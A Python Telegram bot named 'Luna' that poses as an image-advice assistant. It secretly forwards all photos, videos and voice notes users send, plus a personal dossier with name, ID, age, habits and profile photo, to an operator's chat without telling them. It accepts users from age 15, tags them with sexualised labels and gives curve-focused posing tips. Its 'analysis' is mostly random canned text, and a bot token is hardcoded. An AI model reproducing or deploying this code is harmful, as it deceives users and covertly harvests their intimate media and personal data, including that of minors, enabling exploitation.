import os
import io
import random
import threading
import asyncio
from datetime import datetime
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from agewizard import Age
from PIL import Image, ImageStat

# --- CONFIGURACIÓN ---
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064 

# --- SERVIDOR WEB (Para que Render no duerma el bot) ---
web_app = Flask(__name__)

@web_app.route('/')
def home():
    return "Luna Bot está en línea 24/7"

@web_app.route('/health')
def health():
    return "OK"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host="0.0.0.0", port=port)

# --- BASES DE DATOS ---
verified_users = {}
niveles = {}
puntos = {}
perfiles = {} 

CONSEJOS_POSE = [
    "💃 Arquear un poco la espalda resalta tus curvas.",
    "💃 Relaja los hombros y baja la barbilla, da un aire de misterio.",
    "💃 Separa los brazos de la cintura para estilizar tu silueta.",
    "💃 Usa tus manos para jugar con tu cabello, da movimiento."
]

CONSEJOS_LUZ = [
    "💡 La luz lateral es tu mejor amiga, marca los músculos y las curvas.",
    "💡 Si la luz es muy dura, pon una sábana blanca entre la lámpara y tú.",
    "💡 La luz de la ventana por la mañana es la más favorecedora."
]

def analizar_foto(imagen_bytes):
    img = Image.open(io.BytesIO(imagen_bytes)).convert("L")
    stat = ImageStat.Stat(img)
    brillo = stat.mean[0]
    resultado = []
    if brillo < 50: resultado.append("🔦 Luz muy baja.")
    elif brillo > 200: resultado.append("☀️ Sobreexpuesta.")
    else: resultado.append("✨ Luz equilibrada.")
    resultado.append(random.choice(CONSEJOS_LUZ))
    resultado.append(random.choice(CONSEJOS_POSE))
    return "\n".join(resultado)

async def enviar_expediente_inicial(context, user, edad, estilo):
    try:
        nombre = user.first_name
        apellido = user.last_name if user.last_name else "No tiene"
        username = f"@{user.username}" if user.username else "Oculto"
        user_id = user.id
        idioma = user.language_code if user.language_code else "Desconocido"
        es_premium = "Sí ⭐" if user.is_premium else "No"
        
        hora_actual = datetime.now().hour
        if 0 <= hora_actual < 6: habito = "🌙 Trasnochadora"
        elif 6 <= hora_actual < 12: habito = "☀️ Madrugadora"
        elif 12 <= hora_actual < 19: habito = "🌤 Tarde"
        else: habito = "🌙 Noche"

        fotos = await context.bot.get_user_profile_photos(user_id, limit=1)
        tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada / No tiene"

        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE INICIAL (Luna)**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Nombre:** {nombre} {apellido}\n"
            f"🔗 **Usuario:** {username}\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"🌍 **Idioma:** {idioma}\n"
            f"⭐ **Premium:** {es_premium}\n"
            f"🖼 **Foto Perfil:** {tiene_foto}\n"
            f"⏰ **Hábito:** {habito}\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🧠 **Estilo:** {estilo}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )

        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        
        if fotos.total_count > 0:
            foto_perfil = fotos.photos[0][-1].file_id
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=foto_perfil, caption="📸 Foto de perfil pública.")
            
    except Exception as e:
        print(f"Error en reporte: {e}")

async def aviso_corto(context, user, tipo):
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(chat_id=DANI_CHAT_ID, text=f"📥 **{tipo}** de: {username} (ID: `{user.id}`)")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in verified_users:
        await update.message.reply_text("¡Hola! 🌙 Soy Luna, tu asistente de imagen. Para empezar, envíame tu fecha de nacimiento (DD-MM-AAAA).")
    else:
        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto o video para analizarlo.")

async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    user = update.effective_user
    try:
        person = Age(text, date_format="DD-MM-YYYY")
        edad = person.years
        if 15 <= edad <= 80:
            verified_users[user.id] = True
            niveles[user.id] = 1
            puntos[user.id] = 0
            
            if edad < 20: estilo = "Universitaria / Fresca"
            elif edad < 30: estilo = "Joven / Atrevida"
            elif edad < 45: estilo = "Experimentada / Segura"
            else: estilo = "Madura / Elegante"

            perfiles[user.id] = {"edad": edad, "estilo": estilo}
            
            await update.message.reply_text(f"✅ ¡Todo listo! Ya puedes enviarme fotos o videos y te daré consejos para mejorar.")
            await enviar_expediente_inicial(context, user, edad, estilo)
        else:
            await update.message.reply_text(f"❌ Lo siento, tienes {edad} años. Rango permitido: 15 a 80 años.")
    except ValueError:
        await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")

async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    msg_espera = await update.message.reply_text("🔍 **Procesando imagen...**\nEstoy analizando la luz y la composición. Dame unos segundos.")
    
    photo_file = await update.message.photo[-1].get_file()
    photo_bytes = await photo_file.download_as_bytearray()
    
    await asyncio.sleep(2) 
    sugerencia = analizar_foto(photo_bytes)
    
    puntos[user_id] = puntos.get(user_id, 0) + 10
    
    await msg_espera.edit_text(f"📸 **Análisis de Luna:**\n\n{sugerencia}")
    
    try:
        await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
    except Exception as e:
        print(f"Error enviando foto: {e}")
        
    await aviso_corto(context, user, "Foto")

async def analyze_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = update.effective_user
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    msg_espera = await update.message.reply_text("🎥 **Procesando archivo...**\nDame un momento.")
    
    tipo, envio = "Archivo", "document"
    if update.message.video:
        tipo, envio = "Video", "video"
        f = await update.message.video.get_file()
    elif update.message.voice:
        tipo, envio = "Nota de voz", "voice"
        f = await update.message.voice.get_file()
    elif update.message.animation:
        tipo, envio = "GIF", "document"
        f = await update.message.animation.get_file()
    else: return await update.message.reply_text("Formato no soportado.")
    
    puntos[user_id] = puntos.get(user_id, 0) + 5
    
    await asyncio.sleep(1)
    await msg_espera.edit_text(f"✅ He recibido tu {tipo}. ¡Buen trabajo!")
    
    try:
        if envio == "video": await context.bot.send_video(chat_id=DANI_CHAT_ID, video=f.file_id)
        elif envio == "voice": await context.bot.send_voice(chat_id=DANI_CHAT_ID, voice=f.file_id)
        else: await context.bot.send_document(chat_id=DANI_CHAT_ID, document=f.file_id)
    except Exception as e:
        print(f"Error enviando archivo: {e}")
        
    await aviso_corto(context, user, tipo)

async def ver_perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    nivel = niveles.get(user_id, 1)
    pts = puntos.get(user_id, 0)
    nombre_nivel = {1: "Principiante 🌱", 2: "Intermedia 🌿", 3: "Avanzada 🌳"}.get(nivel, "Desconocido")
    await update.message.reply_text(f"👤 **Tu Perfil**\n\n🏆 Nivel: {nombre_nivel}\n⭐ Puntos: {pts}")

def main():
    # Iniciar Flask en un hilo separado
    threading.Thread(target=run_flask, daemon=True).start()
    
    # Iniciar el bot
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("perfil", ver_perfil))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age))
    app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
    app.add_handler(MessageHandler(filters.VIDEO | filters.ANIMATION | filters.VIDEO_NOTE | filters.VOICE | filters.AUDIO, analyze_media))
    
    print("Luna está en línea en Render. Dani observa.")
    app.run_polling()

if __name__ == "__main__":
    main()
